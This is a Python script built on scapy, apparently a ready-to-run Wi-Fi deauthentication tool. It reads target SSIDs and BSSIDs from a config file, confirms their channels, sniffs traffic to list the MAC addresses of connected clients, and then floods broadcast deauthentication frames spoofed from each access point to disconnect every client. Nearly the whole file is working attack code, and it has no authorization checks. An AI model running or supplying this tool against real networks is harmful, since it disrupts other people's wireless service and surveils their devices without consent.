#!/usr/bin/python3

import json
import time
import logging
from scapy.all import *

def load_config(file_path):
    with open(file_path, 'r') as f:
        return json.load(f)

def setup_logging(config):
    level = logging.DEBUG if config['debug'] else logging.INFO
    logging.basicConfig(
        filename=config['log_file'],
        level=level,
        format='%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )

def verify_ap_presence(interface, target_ssid, target_bssid, target_channels, verify_timeout, max_retries):
    logging.info(f"Verifying presence of SSID: {target_ssid}, BSSID: {target_bssid}")
    active_channels = []
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon) and pkt.addr3.lower() == target_bssid.lower():
            channel = int(ord(pkt[Dot11Elt:3].info))
            if channel in target_channels and channel not in active_channels:
                active_channels.append(channel)
                logging.debug(f"Verified {target_ssid} ({target_bssid}) on channel {channel}")
    
    for retry in range(max_retries):
        for channel in target_channels:
            try:
                set_channel(interface, channel)
                sniff(iface=interface, prn=packet_handler, timeout=verify_timeout, 
                      filter=f"type mgt subtype beacon and ether src {target_bssid}")
                if active_channels:
                    break
            except Exception as e:
                logging.error(f"Error while sniffing on channel {channel}: {e}")
        
        if active_channels:
            break
        logging.debug(f"Retry {retry + 1} completed. No active channels found.")
    
    if not active_channels:
        logging.warning(f"Could not verify {target_ssid} ({target_bssid}) on any specified channel after {max_retries} attempts")
    else:
        logging.info(f"Verified {target_ssid} ({target_bssid}) on channels: {active_channels}")
    return active_channels

def set_channel(interface, channel):
    logging.debug(f"Setting channel to {channel}")
    try:
        subprocess.run(['/usr/sbin/iwconfig', interface, 'channel', str(channel)], check=True, capture_output=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to set channel {channel}: {e}")

def monitor_clients(interface, target_ssid, target_bssid, channels, duration):
    logging.info(f"Monitoring clients for {target_ssid} ({target_bssid}) for {duration} seconds")
    discovered_clients = set()

    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            # Check for data frames to/from the target AP
            if pkt.type == 2:  # Data frame
                bssid = None
                client = None

                # Determine BSSID and client based on frame direction
                if pkt.addr1.lower() == target_bssid.lower():
                    bssid = pkt.addr1
                    client = pkt.addr2
                elif pkt.addr2.lower() == target_bssid.lower():
                    bssid = pkt.addr2
                    client = pkt.addr1
                elif pkt.addr3.lower() == target_bssid.lower():
                    bssid = pkt.addr3
                    # addr1 or addr2 could be client, prioritize addr1
                    client = pkt.addr1 if pkt.addr1.lower() != target_bssid.lower() else pkt.addr2

                if bssid and client and client.lower() not in [target_bssid.lower(), 'ff:ff:ff:ff:ff:ff']:
                    if client.lower() not in discovered_clients:
                        discovered_clients.add(client.lower())
                        logging.info(f"Discovered client: {client.upper()} connected to {target_ssid}")

    end_time = time.time() + duration
    while time.time() < end_time:
        for channel in channels:
            set_channel(interface, channel)
            remaining = end_time - time.time()
            if remaining <= 0:
                break
            sniff_time = min(remaining / len(channels), 2)  # Distribute time across channels
            try:
                sniff(iface=interface, prn=packet_handler, timeout=sniff_time, store=False)
            except Exception as e:
                logging.error(f"Error while monitoring on channel {channel}: {e}")

    logging.info(f"Monitoring complete. Total clients discovered: {len(discovered_clients)}")
    if discovered_clients:
        logging.info(f"Client list: {', '.join([c.upper() for c in discovered_clients])}")
    else:
        logging.info("No clients detected during monitoring period")

    return list(discovered_clients)

def deauth_clients(interface, bssid, duration, channels):
    logging.info(f"Deauthenticating clients on BSSID: {bssid} for {duration} seconds on channels: {channels}")
    end_time = time.time() + duration
    while time.time() < end_time:
        for channel in channels:
            set_channel(interface, channel)
            pkt = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid) / Dot11Deauth()
            sendp(pkt, iface=interface, count=64, inter=0.1, verbose=False)
            logging.debug(f"Sent deauth packets on channel {channel}")

def main():
    config = load_config('deauth.json')
    setup_logging(config)

    logging.info("Starting deauthentication script")
    interface = config['interface']
    verify_timeout = config['verify_timeout']
    max_retries = config['max_retries']
    monitor_duration = config['monitor_duration']
    logging.debug(f"Using interface: {interface}")

    for target in config['targets']:
        active_channels = verify_ap_presence(interface, target['ssid'], target['bssid'], target['channels'], verify_timeout, max_retries)
        if active_channels:
            # Monitor for clients before deauth
            clients = monitor_clients(interface, target['ssid'], target['bssid'], active_channels, monitor_duration)

            # Proceed with deauth
            deauth_clients(interface, target['bssid'], config['deauth_duration'], active_channels)
        else:
            logging.warning(f"{target['ssid']} ({target['bssid']}) is not active on any specified channel")

    logging.info("Deauthentication script completed")

if __name__ == "__main__":
    main()
